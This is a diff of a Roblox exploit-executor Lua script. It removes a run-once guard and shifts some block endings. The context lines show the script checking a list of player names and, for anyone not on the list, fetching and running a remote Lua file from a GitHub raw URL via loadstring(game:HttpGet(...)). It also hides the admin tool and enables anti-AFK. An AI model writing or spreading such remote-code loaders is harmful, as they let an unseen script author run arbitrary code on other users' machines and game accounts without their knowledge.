@@ -4,7 +4,7 @@ end)
 
 
 spawn(function()
-    game.Loaded:Wait()
+    game.Loaded:Wait()	
 local lp = game:GetService('Players').LocalPlayer
 
 local names = {
@@ -14,11 +14,6 @@ local names = {
 
 for i,v in pairs(names) do
 if v.Name ~= lp.Name then
-
-if peenis then return end
-    
-getgenv().peenis = true
-    
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/master/sussybaka.lua'))()
 execCmd('hideiy')
 execCmd('antiafk')
@@ -26,7 +21,7 @@ else
     getgenv().ligma = true
     end
 end		
-    
+
 if not ligma then
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
@@ -64,6 +59,7 @@ loadstring(game:HttpGet('https://raw.githubusercontent.com/Junniebug/susimposta/
 execCmd('hideiy')
 execCmd('antiafk')
 end)
+end
 
 getgenv().ws = false
 
@@ -77,7 +73,6 @@ end
 
 game.Players.LocalPlayer.CharacterAdded:Connect(sus)
 sus()
-    end
 end)
 
 
